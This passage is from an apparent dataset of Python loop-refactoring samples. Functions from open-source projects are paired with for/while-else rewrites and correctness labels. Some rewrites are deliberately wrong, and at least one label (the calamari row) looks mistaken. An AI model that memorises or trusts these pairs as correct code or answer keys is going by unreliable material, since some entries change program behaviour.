Scout2,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Scout2/AWSScout2/rules/rule_definition.py,https://github.com/nccgroup/Scout2/tree/master/AWSScout2/rules/rule_definition.py,RuleDefinition,load$36,"def load(self):
        """"""
        Load the definition of the rule, searching in the specified rule dirs first, then in the built-in definitions

        :return:                        None
        """"""
        file_name_valid = False
        rule_type_valid = False
        # Look for a locally-defined rule
        for rule_dir in self.rule_dirs:
            file_path = os.path.join(rule_dir, self.file_name) if rule_dir else self.file_name
            if os.path.isfile(file_path):
                self.file_path = file_path
                file_name_valid = True
                break
        # Look for a built-in rule
        if not file_name_valid:
            for rule_type in self.rule_types:
                if self.file_name.startswith(rule_type):
                    self.file_path = os.path.join(self.rules_data_path, self.file_name)
                    rule_type_valid = True
                    file_name_valid = True
                    break
            if not rule_type_valid:
                for rule_type in self.rule_types:
                    self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
                    if os.path.isfile(self.file_path):
                        file_name_valid = True
                        break
            else:
                if os.path.isfile(self.file_path):
                    file_name_valid = True
        if not file_name_valid:
            printError('Error: could not find %s' % self.file_name)
        else:
            try:
                with open(self.file_path, 'rt') as f:
                    self.string_definition = f.read()
                    self.load_from_string_definition()
            except Exception as e:
                printException(e)
                printError('Failed to load rule defined in %s' % file_path)","for rule_dir in self.rule_dirs:
    file_path = os.path.join(rule_dir, self.file_name) if rule_dir else self.file_name
    if os.path.isfile(file_path):
        self.file_path = file_path
        file_name_valid = True
        break
if not file_name_valid:
    for rule_type in self.rule_types:
        if self.file_name.startswith(rule_type):
            self.file_path = os.path.join(self.rules_data_path, self.file_name)
            rule_type_valid = True
            file_name_valid = True
            break
    if not rule_type_valid:
        for rule_type in self.rule_types:
            self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
            if os.path.isfile(self.file_path):
                file_name_valid = True
                break
    elif os.path.isfile(self.file_path):
        file_name_valid = True","for rule_dir in self.rule_dirs:
    file_path = os.path.join(rule_dir, self.file_name) if rule_dir else self.file_name
    if os.path.isfile(file_path):
        self.file_path = file_path
        file_name_valid = True
        break
else:
    for rule_type in self.rule_types:
        if self.file_name.startswith(rule_type):
            self.file_path = os.path.join(self.rules_data_path, self.file_name)
            rule_type_valid = True
            file_name_valid = True
            break
    if not rule_type_valid:
        for rule_type in self.rule_types:
            self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
            if os.path.isfile(self.file_path):
                file_name_valid = True
                break
    elif os.path.isfile(self.file_path):
        file_name_valid = True","for rule_dir in self.rule_dirs:
    file_path = os.path.join(rule_dir, self.file_name) if rule_dir else self.file_name
    if os.path.isfile(file_path):
        self.file_path = file_path
        file_name_valid = True
        break
else:
    for rule_type in self.rule_types:
        if self.file_name.startswith(rule_type):
            self.file_path = os.path.join(self.rules_data_path, self.file_name)
            rule_type_valid = True
            file_name_valid = True
            break
    if not rule_type_valid:
        for rule_type in self.rule_types:
            self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
            if os.path.isfile(self.file_path):
                file_name_valid = True
                break
    elif os.path.isfile(self.file_path):
        file_name_valid = True",1,"for rule_dir in self.rule_dirs:
    file_path = os.path.join(rule_dir, self.file_name) if rule_dir else self.file_name
    if os.path.isfile(file_path):
        self.file_path = file_path
        file_name_valid = True
        break
if not file_name_valid:
    for rule_type in self.rule_types:
        if self.file_name.startswith(rule_type):
            self.file_path = os.path.join(self.rules_data_path, self.file_name)
            rule_type_valid = True
            file_name_valid = True
            break
    if not rule_type_valid:
        for rule_type in self.rule_types:
            self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
            if os.path.isfile(self.file_path):
                file_name_valid = True
                break
    elif os.path.isfile(self.file_path):
        file_name_valid = True","break statement is executed:None
break statement is not executed:zejun1"
Scout2,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Scout2/AWSScout2/rules/rule_definition.py,https://github.com/nccgroup/Scout2/tree/master/AWSScout2/rules/rule_definition.py,RuleDefinition,load$36,"def load(self):
        """"""
        Load the definition of the rule, searching in the specified rule dirs first, then in the built-in definitions

        :return:                        None
        """"""
        file_name_valid = False
        rule_type_valid = False
        # Look for a locally-defined rule
        for rule_dir in self.rule_dirs:
            file_path = os.path.join(rule_dir, self.file_name) if rule_dir else self.file_name
            if os.path.isfile(file_path):
                self.file_path = file_path
                file_name_valid = True
                break
        # Look for a built-in rule
        if not file_name_valid:
            for rule_type in self.rule_types:
                if self.file_name.startswith(rule_type):
                    self.file_path = os.path.join(self.rules_data_path, self.file_name)
                    rule_type_valid = True
                    file_name_valid = True
                    break
            if not rule_type_valid:
                for rule_type in self.rule_types:
                    self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
                    if os.path.isfile(self.file_path):
                        file_name_valid = True
                        break
            else:
                if os.path.isfile(self.file_path):
                    file_name_valid = True
        if not file_name_valid:
            printError('Error: could not find %s' % self.file_name)
        else:
            try:
                with open(self.file_path, 'rt') as f:
                    self.string_definition = f.read()
                    self.load_from_string_definition()
            except Exception as e:
                printException(e)
                printError('Failed to load rule defined in %s' % file_path)","for rule_type in self.rule_types:
    if self.file_name.startswith(rule_type):
        self.file_path = os.path.join(self.rules_data_path, self.file_name)
        rule_type_valid = True
        file_name_valid = True
        break
if not rule_type_valid:
    for rule_type in self.rule_types:
        self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
        if os.path.isfile(self.file_path):
            file_name_valid = True
            break
elif os.path.isfile(self.file_path):
    file_name_valid = True","for rule_type in self.rule_types:
    if self.file_name.startswith(rule_type):
        self.file_path = os.path.join(self.rules_data_path, self.file_name)
        file_name_valid = True
        if not not rule_type_valid:
            if os.path.isfile(self.file_path):
                file_name_valid = True
        break
else:
    for rule_type in self.rule_types:
        self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
        if os.path.isfile(self.file_path):
            file_name_valid = True
            break","for rule_type in self.rule_types:
    if self.file_name.startswith(rule_type):
        self.file_path = os.path.join(self.rules_data_path, self.file_name)
        file_name_valid = True
        if os.path.isfile(self.file_path):
            file_name_valid = True
        break
else:
    for rule_type in self.rule_types:
        self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
        if os.path.isfile(self.file_path):
            file_name_valid = True
            break",0,"for rule_type in self.rule_types:
    if self.file_name.startswith(rule_type):
        self.file_path = os.path.join(self.rules_data_path, self.file_name)
        rule_type_valid = True
        file_name_valid = True
        break
if not rule_type_valid:
    for rule_type in self.rule_types:
        self.file_path = os.path.join(self.rules_data_path, rule_type, self.file_name)
        if os.path.isfile(self.file_path):
            file_name_valid = True
            break
elif os.path.isfile(self.file_path):
    file_name_valid = True","break statement is executed:None
break statement is not executed:zejun1"
programmingbitcoin,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/programmingbitcoin/code-ch07/op.py,https://github.com/jimmysong/programmingbitcoin/tree/master/code-ch07/op.py,,op_notif$193,"def op_notif(stack, items):
    if len(stack) < 1:
        return False
    # go through and re-make the items array based on the top stack element
    true_items = []
    false_items = []
    current_array = true_items
    found = False
    num_endifs_needed = 1
    while len(items) > 0:
        item = items.pop(0)
        if item in (99, 100):
            # nested if, we have to go another endif
            num_endifs_needed += 1
            current_array.append(item)
        elif num_endifs_needed == 1 and item == 103:
            current_array = false_items
        elif item == 104:
            if num_endifs_needed == 1:
                found = True
                break
            else:
                num_endifs_needed -= 1
                current_array.append(item)
        else:
            current_array.append(item)
    if not found:
        return False
    element = stack.pop()
    if decode_num(element) == 0:
        items[:0] = true_items
    else:
        items[:0] = false_items
    return True","while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            found = True
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
if not found:
    return False","while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
else:
    return False","while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
else:
    return False",1,"while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            found = True
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
if not found:
    return False","break statement is executed:None
break statement is not executed:zejun1"
angr,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/angr/angr/analyses/girlscout.py,https://github.com/angr/angr/tree/master/angr/analyses/girlscout.py,GirlScout,_get_next_addr_to_search$84,"def _get_next_addr_to_search(self, alignment=None):
        # TODO: Take care of those functions that are already generated
        curr_addr = self._next_addr
        if self._seg_list.has_blocks:
            curr_addr = self._seg_list.next_free_pos(curr_addr)

        if alignment is not None:
            if curr_addr % alignment > 0:
                curr_addr = curr_addr - curr_addr % alignment + alignment

        # Make sure curr_addr exists in binary
        accepted = False
        for start, end in self._valid_memory_regions:
            if curr_addr >= start and curr_addr < end:
                # accept
                accepted = True
                break
            if curr_addr < start:
                # accept, but we are skipping the gap
                accepted = True
                curr_addr = start

        if not accepted:
            # No memory available!
            return None

        self._next_addr = curr_addr
        if self._end is None or curr_addr < self._end:
            l.debug(""Returning new recon address: 0x%08x"", curr_addr)
            return curr_addr
        else:
            l.debug(""0x%08x is beyond the ending point."", curr_addr)
            return None","for (start, end) in self._valid_memory_regions:
    if curr_addr >= start and curr_addr < end:
        accepted = True
        break
    if curr_addr < start:
        accepted = True
        curr_addr = start
if not accepted:
    return None","for (start, end) in self._valid_memory_regions:
    if curr_addr >= start and curr_addr < end:
        break
    if curr_addr < start:
        accepted = True
        curr_addr = start
else:
    return None","for (start, end) in self._valid_memory_regions:
    if curr_addr >= start and curr_addr < end:
        accepted = True
        break
    if curr_addr < start:
        accepted = True
        curr_addr = start
else:
    return None",0,"for (start, end) in self._valid_memory_regions:
    if curr_addr >= start and curr_addr < end:
        accepted = True
        break
    if curr_addr < start:
        accepted = True
        curr_addr = start
if not accepted:
    return None","break statement is executed:None
break statement is not executed:zejun1"
merchant,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/merchant/billing/gateway.py,https://github.com/agiliq/merchant/tree/master/billing/gateway.py,Gateway,validate_card$43,"def validate_card(self, credit_card):
        """"""Checks if the credit card is supported by the gateway
        and calls the `is_valid` method on it. Responsibility
        of the gateway author to use this method before every
        card transaction.""""""
        card_supported = None
        for card in self.supported_cardtypes:
            card_supported = card.regexp.match(credit_card.number)
            if card_supported:
                credit_card.card_type = card
                break
        if not card_supported:
            raise CardNotSupported(""This credit card is not ""
                                   ""supported by the gateway."")
        # Gateways might provide some random number which
        # might not pass Luhn's test.
        if self.test_mode:
            return True
        return credit_card.is_valid()","for card in self.supported_cardtypes:
    card_supported = card.regexp.match(credit_card.number)
    if card_supported:
        credit_card.card_type = card
        break
if not card_supported:
    raise CardNotSupported('This credit card is not supported by the gateway.')","for card in self.supported_cardtypes:
    card_supported = card.regexp.match(credit_card.number)
    if card_supported:
        credit_card.card_type = card
        break
else:
    raise CardNotSupported('This credit card is not supported by the gateway.')","for card in self.supported_cardtypes:
    card_supported = card.regexp.match(credit_card.number)
    if card_supported:
        credit_card.card_type = card
        break
else:
    raise CardNotSupported('This credit card is not supported by the gateway.')",1,"for card in self.supported_cardtypes:
    card_supported = card.regexp.match(credit_card.number)
    if card_supported:
        credit_card.card_type = card
        break
if not card_supported:
    raise CardNotSupported('This credit card is not supported by the gateway.')","break statement is executed:None
break statement is not executed:zejun1"
calamari,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/calamari/calamari_ocr/ocr/dataset/textprocessors/str_to_char_list.py,https://github.com/Calamari-OCR/calamari/tree/master/calamari_ocr/ocr/dataset/textprocessors/str_to_char_list.py,StrToCharListProcessor,_apply_single$21,"def _apply_single(self, txt, meta):
        index = 0
        out = []
        while index < len(txt):
            found = False
            for char in self.params.chars:
                if len(char) == 0:
                    continue  # blank
                if txt[index : index + len(char)] == char:
                    out.append(char)
                    index += len(char)
                    found = True
                    break

            if found:
                continue

            else:
                raise Exception(""Could not parse remainder '{}' of '{}'"".format(txt[index:], txt))

        return out","for char in self.params.chars:
    if len(char) == 0:
        continue
    if txt[index:index + len(char)] == char:
        out.append(char)
        index += len(char)
        found = True
        break
if found:
    continue
else:
    raise Exception(""Could not parse remainder '{}' of '{}'"".format(txt[index:], txt))","for char in self.params.chars:
    if len(char) == 0:
        continue
    if txt[index:index + len(char)] == char:
        out.append(char)
        index += len(char)
        continue
        break
else:
    raise Exception(""Could not parse remainder '{}' of '{}'"".format(txt[index:], txt))","for char in self.params.chars:
    if len(char) == 0:
        continue
    if txt[index:index + len(char)] == char:
        out.append(char)
        index += len(char)
        continue
        break
else:
    raise Exception(""Could not parse remainder '{}' of '{}'"".format(txt[index:], txt))",1,"for char in self.params.chars:
    if len(char) == 0:
        continue
    if txt[index:index + len(char)] == char:
        out.append(char)
        index += len(char)
        found = True
        break
if found:
    continue
else:
    raise Exception(""Could not parse remainder '{}' of '{}'"".format(txt[index:], txt))","break statement is executed:zejun1
break statement is not executed:None"
armory,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/armory/blender/arm/props_bake.py,https://github.com/armory3d/armory/tree/master/blender/arm/props_bake.py,ArmBakeApplyButton,execute$243,"def execute(self, context):
        scn = context.scene
        if len(scn.arm_bakelist) == 0:
            return{'FINISHED'}
        # Remove leftover _baked materials for removed objects
        for mat in bpy.data.materials:
            if mat.name.endswith('_baked'):
                has_user = False
                for ob in bpy.data.objects:
                    if ob.type == 'MESH' and mat.name.endswith('_' + ob.name + '_baked'):
                        has_user = True
                        break
                if not has_user:
                    bpy.data.materials.remove(mat, do_unlink=True)
        # Recache lightmaps
        arm.assets.invalidate_unpacked_data(None, None)
        for o in scn.arm_bakelist:
            ob = o.obj
            img_name = ob.name + '_baked'
            # Save images
            bpy.data.images[img_name].pack()
            bpy.data.images[img_name].save()
            for slot in ob.material_slots:
                mat = slot.material
                # Remove temp material
                if mat.name.endswith('_temp'):
                    old = slot.material
                    slot.material = bpy.data.materials[old.name.split('_' + ob.name)[0]]
                    bpy.data.materials.remove(old, do_unlink=True)
        # Restore uv slots
        for o in scn.arm_bakelist:
            ob = o.obj
            uv_layers = ob.data.uv_layers
            uv_layers.active_index = 0

        return{'FINISHED'}","for ob in bpy.data.objects:
    if ob.type == 'MESH' and mat.name.endswith('_' + ob.name + '_baked'):
        has_user = True
        break
if not has_user:
    bpy.data.materials.remove(mat, do_unlink=True)","for ob in bpy.data.objects:
    if ob.type == 'MESH' and mat.name.endswith('_' + ob.name + '_baked'):
        break
else:
    bpy.data.materials.remove(mat, do_unlink=True)","for ob in bpy.data.objects:
    if ob.type == 'MESH' and mat.name.endswith('_' + ob.name + '_baked'):
        break
else:
    bpy.data.materials.remove(mat, do_unlink=True)",1,"for ob in bpy.data.objects:
    if ob.type == 'MESH' and mat.name.endswith('_' + ob.name + '_baked'):
        has_user = True
        break
if not has_user:
    bpy.data.materials.remove(mat, do_unlink=True)","break statement is executed:None
break statement is not executed:zejun1"
EssayKiller_V2,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/EssayKiller_V2/LanguageNetwork/GPT2/dataset/tokenization/tokenization.py,https://github.com/EssayKillerBrain/EssayKiller_V2/tree/master/LanguageNetwork/GPT2/dataset/tokenization/tokenization.py,WordpieceTokenizer,tokenize$308,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.

    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.

    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]

    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.

    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
          if start > 0:
            substr = ""##"" + substr
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
EssayKiller_V2,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/EssayKiller_V2/LanguageNetwork/GPT2/dataset/tokenization/tokenization.py,https://github.com/EssayKillerBrain/EssayKiller_V2/tree/master/LanguageNetwork/GPT2/dataset/tokenization/tokenization.py,WordpieceTokenizer,tokenize$308,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.

    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.

    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]

    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.

    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
          if start > 0:
            substr = ""##"" + substr
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
fonttools,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/fonttools/Lib/fontTools/ttLib/tables/TupleVariation.py,https://github.com/fonttools/fonttools/tree/master/Lib/fontTools/ttLib/tables/TupleVariation.py,TupleVariation,compileIntermediateCoord$175,"def compileIntermediateCoord(self, axisTags):
		needed = False
		for axis in axisTags:
			minValue, value, maxValue = self.axes.get(axis, (0.0, 0.0, 0.0))
			defaultMinValue = min(value, 0.0)  # -0.3 --> -0.3; 0.7 --> 0.0
			defaultMaxValue = max(value, 0.0)  # -0.3 -->  0.0; 0.7 --> 0.7
			if (minValue != defaultMinValue) or (maxValue != defaultMaxValue):
				needed = True
				break
		if not needed:
			return None
		minCoords = bytearray()
		maxCoords = bytearray()
		for axis in axisTags:
			minValue, value, maxValue = self.axes.get(axis, (0.0, 0.0, 0.0))
			minCoords.extend(struct.pack("">h"", fl2fi(minValue, 14)))
			maxCoords.extend(struct.pack("">h"", fl2fi(maxValue, 14)))
		return minCoords + maxCoords","for axis in axisTags:
    (minValue, value, maxValue) = self.axes.get(axis, (0.0, 0.0, 0.0))
    defaultMinValue = min(value, 0.0)
    defaultMaxValue = max(value, 0.0)
    if minValue != defaultMinValue or maxValue != defaultMaxValue:
        needed = True
        break
if not needed:
    return None","for axis in axisTags:
    (minValue, value, maxValue) = self.axes.get(axis, (0.0, 0.0, 0.0))
    defaultMinValue = min(value, 0.0)
    defaultMaxValue = max(value, 0.0)
    if minValue != defaultMinValue or maxValue != defaultMaxValue:
        break
else:
    return None","for axis in axisTags:
    (minValue, value, maxValue) = self.axes.get(axis, (0.0, 0.0, 0.0))
    defaultMinValue = min(value, 0.0)
    defaultMaxValue = max(value, 0.0)
    if minValue != defaultMinValue or maxValue != defaultMaxValue:
        break
else:
    return None",1,"for axis in axisTags:
    (minValue, value, maxValue) = self.axes.get(axis, (0.0, 0.0, 0.0))
    defaultMinValue = min(value, 0.0)
    defaultMaxValue = max(value, 0.0)
    if minValue != defaultMinValue or maxValue != defaultMaxValue:
        needed = True
        break
if not needed:
    return None","break statement is executed:None
break statement is not executed:zejun1"
tslearn,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tslearn/tslearn/metrics/dtw_variants.py,https://github.com/tslearn-team/tslearn/tree/master/tslearn/metrics/dtw_variants.py,,itakura_mask$1023,"def itakura_mask(sz1, sz2, max_slope=2.):
    """"""Compute the Itakura mask.

    Parameters
    ----------
    sz1 : int
        The size of the first time series

    sz2 : int
        The size of the second time series.

    max_slope : float (default = 2)
        The maximum slope of the parallelogram.

    Returns
    -------
    mask : array, shape = (sz1, sz2)
        Itakura mask.

    Examples
    --------
    >>> itakura_mask(6, 6)
    array([[ 0., inf, inf, inf, inf, inf],
           [inf,  0.,  0., inf, inf, inf],
           [inf,  0.,  0.,  0., inf, inf],
           [inf, inf,  0.,  0.,  0., inf],
           [inf, inf, inf,  0.,  0., inf],
           [inf, inf, inf, inf, inf,  0.]])
    """"""
    mask = _njit_itakura_mask(sz1, sz2, max_slope=max_slope)

    # Post-check
    raise_warning = False
    for i in prange(sz1):
        if not numpy.any(numpy.isfinite(mask[i])):
            raise_warning = True
            break
    if not raise_warning:
        for j in prange(sz2):
            if not numpy.any(numpy.isfinite(mask[:, j])):
                raise_warning = True
                break
    if raise_warning:
        warnings.warn(""'itakura_max_slope' constraint is unfeasible ""
                      ""(ie. leads to no admissible path) for the ""
                      ""provided time series sizes"",
                      RuntimeWarning)

    return mask","for i in prange(sz1):
    if not numpy.any(numpy.isfinite(mask[i])):
        raise_warning = True
        break
if not raise_warning:
    for j in prange(sz2):
        if not numpy.any(numpy.isfinite(mask[:, j])):
            raise_warning = True
            break","for i in prange(sz1):
    if not numpy.any(numpy.isfinite(mask[i])):
        raise_warning = True
        break
else:
    for j in prange(sz2):
        if not numpy.any(numpy.isfinite(mask[:, j])):
            raise_warning = True
            break","for i in prange(sz1):
    if not numpy.any(numpy.isfinite(mask[i])):
        raise_warning = True
        break
else:
    for j in prange(sz2):
        if not numpy.any(numpy.isfinite(mask[:, j])):
            raise_warning = True
            break",1,"for i in prange(sz1):
    if not numpy.any(numpy.isfinite(mask[i])):
        raise_warning = True
        break
if not raise_warning:
    for j in prange(sz2):
        if not numpy.any(numpy.isfinite(mask[:, j])):
            raise_warning = True
            break","break statement is executed:None
break statement is not executed:zejun1"
interactive-deep-colorization,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/interactive-deep-colorization/ui/ui_control.py,https://github.com/junyanz/interactive-deep-colorization/tree/master/ui/ui_control.py,UIControl,used_colors$148,"def used_colors(self):  # get recently used colors
        if len(self.userEdits) == 0:
            return None
        nEdits = len(self.userEdits)
        ui_counts = np.zeros(nEdits)
        ui_colors = np.zeros((nEdits, 3))
        for n, ue in enumerate(self.userEdits):
            ui_counts[n] = ue.ui_count
            c = ue.userColor
            ui_colors[n, :] = [c.red(), c.green(), c.blue()]

        ui_counts = np.array(ui_counts)
        ids = np.argsort(-ui_counts)
        ui_colors = ui_colors[ids, :]
        unique_colors = []
        for ui_color in ui_colors:
            is_exit = False
            for u_color in unique_colors:
                d = np.sum(np.abs(u_color - ui_color))
                if d < 0.1:
                    is_exit = True
                    break

            if not is_exit:
                unique_colors.append(ui_color)

        unique_colors = np.vstack(unique_colors)
        return unique_colors / 255.0","for u_color in unique_colors:
    d = np.sum(np.abs(u_color - ui_color))
    if d < 0.1:
        is_exit = True
        break
if not is_exit:
    unique_colors.append(ui_color)","for u_color in unique_colors:
    d = np.sum(np.abs(u_color - ui_color))
    if d < 0.1:
        break
else:
    unique_colors.append(ui_color)","for u_color in unique_colors:
    d = np.sum(np.abs(u_color - ui_color))
    if d < 0.1:
        break
else:
    unique_colors.append(ui_color)",1,"for u_color in unique_colors:
    d = np.sum(np.abs(u_color - ui_color))
    if d < 0.1:
        is_exit = True
        break
if not is_exit:
    unique_colors.append(ui_color)","break statement is executed:None
break statement is not executed:zejun1"
alexa-skills-kit-sdk-for-python,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/alexa-skills-kit-sdk-for-python/ask-sdk-runtime/ask_sdk_runtime/dispatch.py,https://github.com/alexa/alexa-skills-kit-sdk-for-python/tree/master/ask-sdk-runtime/ask_sdk_runtime/dispatch.py,GenericRequestDispatcher,__dispatch_request$135,"def __dispatch_request(self, handler_input):
        # type: (Input) -> Union[Output, None]
        """"""Process the request and return handler output.

        When the method is invoked, using the registered list of
        :py:class:`RequestMapper`, a Handler Chain is found that can
        handle the request. The handler invocation is delegated to the
        supported :py:class:`HandlerAdapter`. The registered
        request interceptors in the handler chain are processed before
        executing the handler. The registered response interceptors in
        the handler chain are processed after executing the handler.

        :param handler_input: generic input to the dispatcher containing
            incoming request and other context.
        :type handler_input: Input
        :return: Output from the 'handle' method execution of the
            supporting handler.
        :rtype: Union[None, Output]
        :raises DispatchException if there is no supporting
            handler chain or adapter
        """"""
        request_handler_chain = None
        for mapper in self.request_mappers:
            request_handler_chain = mapper.get_request_handler_chain(
                handler_input)
            if request_handler_chain is not None:
                break

        if request_handler_chain is None:
            raise DispatchException(
                ""Unable to find a suitable request handler"")

        request_handler = request_handler_chain.request_handler
        supported_handler_adapter = None
        for adapter in self.handler_adapters:
            if adapter.supports(request_handler):
                supported_handler_adapter = adapter
                break

        if supported_handler_adapter is None:
            raise DispatchException(
                ""Unable to find a suitable request adapter"")

        local_request_interceptors = request_handler_chain.request_interceptors
        for interceptor in local_request_interceptors:
            interceptor.process(handler_input=handler_input)

        output = supported_handler_adapter.execute(
            handler_input=handler_input, handler=request_handler)  # type: Union[Output, None]

        local_response_interceptors = (
            request_handler_chain.response_interceptors)
        for response_interceptor in local_response_interceptors:
            response_interceptor.process(
                handler_input=handler_input, response=output)

        return output","for mapper in self.request_mappers:
    request_handler_chain = mapper.get_request_handler_chain(handler_input)
    if request_handler_chain is not None:
        break
if request_handler_chain is None:
    raise DispatchException('Unable to find a suitable request handler')","for mapper in self.request_mappers:
    request_handler_chain = mapper.get_request_handler_chain(handler_input)
    if request_handler_chain is not None:
        break
else:
    raise DispatchException('Unable to find a suitable request handler')","for mapper in self.request_mappers:
    request_handler_chain = mapper.get_request_handler_chain(handler_input)
    if request_handler_chain is not None:
        break
else:
    raise DispatchException('Unable to find a suitable request handler')",1,"for mapper in self.request_mappers:
    request_handler_chain = mapper.get_request_handler_chain(handler_input)
    if request_handler_chain is not None:
        break
if request_handler_chain is None:
    raise DispatchException('Unable to find a suitable request handler')","break statement is executed:None
break statement is not executed:zejun1"
alexa-skills-kit-sdk-for-python,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/alexa-skills-kit-sdk-for-python/ask-sdk-runtime/ask_sdk_runtime/dispatch.py,https://github.com/alexa/alexa-skills-kit-sdk-for-python/tree/master/ask-sdk-runtime/ask_sdk_runtime/dispatch.py,GenericRequestDispatcher,__dispatch_request$135,"def __dispatch_request(self, handler_input):
        # type: (Input) -> Union[Output, None]
        """"""Process the request and return handler output.

        When the method is invoked, using the registered list of
        :py:class:`RequestMapper`, a Handler Chain is found that can
        handle the request. The handler invocation is delegated to the
        supported :py:class:`HandlerAdapter`. The registered
        request interceptors in the handler chain are processed before
        executing the handler. The registered response interceptors in
        the handler chain are processed after executing the handler.

